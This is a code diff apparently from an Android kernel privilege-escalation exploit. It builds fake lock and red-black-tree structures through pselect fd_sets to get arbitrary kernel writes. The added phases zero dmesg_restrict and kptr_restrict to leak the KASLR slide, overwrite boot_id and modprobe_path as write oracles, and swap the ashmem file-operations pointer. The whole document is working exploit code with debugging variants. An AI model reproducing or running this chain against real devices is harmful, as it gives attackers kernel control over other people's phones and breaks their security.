@@ -119,6 +119,7 @@ static int pselect_words_per_set(void) {
 }
 
 int pselect_shift_override = -100;
+uintptr_t sc_task_override = 0; /* SC_*: word8 task (0=init_task default) */
 
 static int pselect_put_global_word(
     fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
@@ -328,7 +329,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               (unsigned long long)init_task);
     } else {
       uint64_t pi_parent = 0, pi_right = 0, pi_left = 0;
-      uint64_t stack_task = init_task;
+      uint64_t stack_task = sc_task_override ? sc_task_override : init_task;
       if (pselect_custom_write == 4 && fake_fops) {
         uint64_t misc_off =
             (active_offsets && active_offsets->off_ashmem_misc_fops)
@@ -455,13 +456,90 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
          * leftmost hazard of erasing a node from a tree that already links
          * it. See docs/WALK_DETERMINISM_MASTER_PLAN_2026-08-17.md.
          */
-        if (env_flag("MODE4_STATIC_CHAIN", 0)) {
+        if (env_flag("MODE4_STATIC_CHAIN", 0) &&
+            env_flag("MODE4_SC_UMASK", 0)) {
+          /* Two benign zero-stores to unmask kernel info sources:
+           * ph1: *(P0 dmesg_restrict)=0  ph2: *(P0 kptr_restrict)=0
+           * (kallsyms: dmesg_restrict B 0x02A0?D20, kptr_restrict D 0x027BCF68)
+           * then userspace reads dmesg/kallsyms for the KASLR slide. */
           int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
-          /* KIMAGE VA directly (kernel-context write; no P0 alias math) */
+          uint64_t tail = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+              (uint64_t)(active_offsets ? active_offsets->off_bss_tail_lock : 0));
+          uint64_t tgt_off = (ph == 1) ? 0x029C9D20ULL
+                                 : (ph == 2 ? 0x027BCF68ULL : 0x02A793C8ULL);
+          tree_pc = 0;              /* value = 0 */
+          if (ph == 4) {
+            /* visible oracle: magic into bootid proves stores landed */
+            uint64_t bid_off = (active_offsets && active_offsets->off_slide_boot_id)
+                                   ? (uint64_t)active_offsets->off_slide_boot_id
+                                   : SLIDE_SYSCTL_BOOTID_OFF;
+            tree_pc = tail + 0x40;
+            tgt_off = bid_off;
+          }
+          tree_r = 0;
+          tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + tgt_off);
+          pi_parent = 0; pi_right = 0; pi_left = 0;
+          stack_prio = 3;
+          stack_deadline = 0;
+          stack_lock = tail + 0x400 + (uint64_t)(ph - 1) * 0x20;
+          pr_info("stack mode4 SC_UMASK ph=%d *(%016llx)=0\n",
+                  ph, (unsigned long long)tree_l);
+        } else if (env_flag("MODE4_STATIC_CHAIN", 0) &&
+            env_flag("MODE4_SC_TRAP3", 0)) {
+          /* ERASE-EXECUTION trap: parent_color = text|1 -> Case-1-else's
+           * __rb_change_child WRITES parent(text)->rb_right -> RO store ->
+           * softboot IFF the rb_erase store path truly executes. */
+          int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
+          (void)ph;
+          tree_pc = (uint64_t)text_addr(KIMAGE_TEXT_BASE +
+                       (active_offsets ? active_offsets->off_ashmem_ioctl : 0)) | 1;
+          tree_r = 0;
+          tree_l = KIMAGE_TEXT_BASE +
+                   ((active_offsets && active_offsets->off_slide_boot_id)
+                        ? (uint64_t)active_offsets->off_slide_boot_id
+                        : SLIDE_SYSCTL_BOOTID_OFF);
+          pi_parent = 0; pi_right = 0; pi_left = 0;
+          stack_prio = 3;
+          stack_deadline = 0;
+          stack_lock = KIMAGE_TEXT_BASE +
+                       (uint64_t)(active_offsets ? active_offsets->off_bss_tail_lock : 0) + 0x400;
+          pr_info("stack mode4 SC_TRAP3 erase-trap pc=text|1 left=bootid lock=tail\n");
+        } else if (env_flag("MODE4_STATIC_CHAIN", 0) &&
+            env_flag("MODE4_SC_DIAG", 0)) {
+          /* Stamp-presence discriminator:
+           * ph1: *bootid = tail+8 (store; benign lock) -> readback
+           * ph2: SAME store but lock=text -> softboot IFF stamp present
+           * (walk reads our word9). silent+softboot => store-path guard;
+           * silent+silent => stamp missed the rt_waiter slot this boot. */
+          int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
+          uint64_t tail = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+              (uint64_t)(active_offsets ? active_offsets->off_bss_tail_lock : 0));
+          uint64_t bid_off = (active_offsets && active_offsets->off_slide_boot_id)
+                                 ? (uint64_t)active_offsets->off_slide_boot_id
+                                 : SLIDE_SYSCTL_BOOTID_OFF;
+          tree_pc = tail + 8;
+          tree_r = 0;
+          tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + bid_off);
+          pi_parent = 0; pi_right = 0; pi_left = 0;
+          stack_prio = 3;
+          stack_deadline = 0;
+          stack_lock = (ph == 2)
+              ? (uint64_t)text_addr(KIMAGE_TEXT_BASE +
+                    (active_offsets ? active_offsets->off_ashmem_ioctl : 0))
+              : tail + 0x400;
+          pr_info("stack mode4 SC_DIAG ph=%d *bootid=tail+8 lock=%016llx (%s)\n",
+                  ph, (unsigned long long)stack_lock,
+                  ph == 2 ? "TEXT TRAP" : "tail slot");
+        } else if (env_flag("MODE4_STATIC_CHAIN", 0)) {
+          int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
+          /* P0 physmap alias — the ONLY target form the walk's stores
+           * actually land through (F27 proof: P0 bootid readback changed;
+           * KIMAGE form writes vanish). */
           uint64_t tail =
-              KIMAGE_TEXT_BASE +
-              (uint64_t)(active_offsets ? active_offsets->off_bss_tail_lock
-                                        : 0);
+              (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+                                  (active_offsets
+                                       ? active_offsets->off_bss_tail_lock
+                                       : 0));
           struct {
             uint64_t slot; /* TAIL-relative target (0 = swap MISC) */
             uint64_t val;  /* value to store */
@@ -496,16 +574,17 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           tree_pc = tab[ti].val;
           tree_r = 0;
           tree_l = tab[ti].slot ? (tail + tab[ti].slot)
-                                : (KIMAGE_TEXT_BASE +
-                                   (active_offsets
-                                        ? (uint64_t)active_offsets->off_ashmem_misc_fops
-                                        : ASHMEM_MISC_FOPS_OFF));
+                                : (uint64_t)data_addr(
+                                      KIMAGE_TEXT_BASE +
+                                      (active_offsets
+                                           ? (uint64_t)active_offsets->off_ashmem_misc_fops
+                                           : ASHMEM_MISC_FOPS_OFF));
           if (env_flag("MODE4_SC_BOOTID_ALL", 0)) {
             /* per-phase shift sweep: the overlay may be offset vs the
              * dangling waiter frame; try -2..+4 across phases. */
             if (env_flag("MODE4_SC_SWEEP", 0)) {
               extern int pselect_shift_override;
-              static const int sweep[] = {-2, -1, 1, 2, 3};
+              static const int sweep[] = {-4, -5, -6, -7};
               int si = (ph - 1) % 5;
               pselect_shift_override = sweep[si];
               pr_info("SC_BOOTID_ALL ph=%d shift=%d\n", ph,
@@ -516,7 +595,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
             uint64_t bid_off = (active_offsets && active_offsets->off_slide_boot_id)
                                    ? (uint64_t)active_offsets->off_slide_boot_id
                                    : SLIDE_SYSCTL_BOOTID_OFF;
-            tree_l = KIMAGE_TEXT_BASE + bid_off;
+            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + bid_off);
             tree_pc = tail + (uint64_t)ph * 8;
             if (env_flag("MODE4_SC_MODPROBE", 0)) {
               /* visible-store oracle: garble modprobe_path (readable via
@@ -1238,12 +1317,12 @@ void do_pselect_fake_lock_route(void) {
   int sc = env_flag("MODE4_STATIC_CHAIN", 0);
   int vs_retries = 0; /* reclaim-loss retries consumed by VERIFY_SWAP */
   const int VS_MAX_RECLAIM_RETRIES = 4;
-  int max_att = sc ? 7 : (vs ? 2
+  int max_att = env_flag("MODE4_SC_UMASK", 0) ? 4 : (env_flag("MODE4_SC_DIAG", 0) ? 2 : (sc ? 7 : (vs ? 2
                    : (pad3 ? 3
                           : (zio || chain ? 3
                                          : ((zion || zi || wion)
                                                 ? 2
-                                                : PSELECT_CFI_ROUTE_ATTEMPTS))));
+                                                : PSELECT_CFI_ROUTE_ATTEMPTS))))));
   if (sc)
     pr_info("MODE4_STATIC_CHAIN=1: 7 deterministic walks - build fops "
             "table in kernel image tail, then *MISC swap. No spray.\n");
@@ -1453,7 +1532,8 @@ void do_pselect_fake_lock_route(void) {
       usleep(10000);
     }
 
-    if (env_flag("MODE4_SC_BOOTID_ALL", 0)) {
+    if (env_flag("MODE4_SC_BOOTID_ALL", 0) ||
+        env_flag("MODE4_SC_DIAG", 0)) {
       char bb[48] = {0};
       char bpath[64];
       snprintf(bpath, sizeof(bpath), "%s",
@@ -1736,7 +1816,8 @@ void do_pselect_fake_lock_route(void) {
     }
     /* STATIC_CHAIN: every phase's walk IS the goal — continue through the
      * final swap phase regardless of intermediate probe outcomes. */
-    if (sc && route_attempt < max_att) {
+    if ((sc || env_flag("MODE4_SC_DIAG", 0) ||
+         env_flag("MODE4_SC_UMASK", 0)) && route_attempt < max_att) {
       continue;
     }
     if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
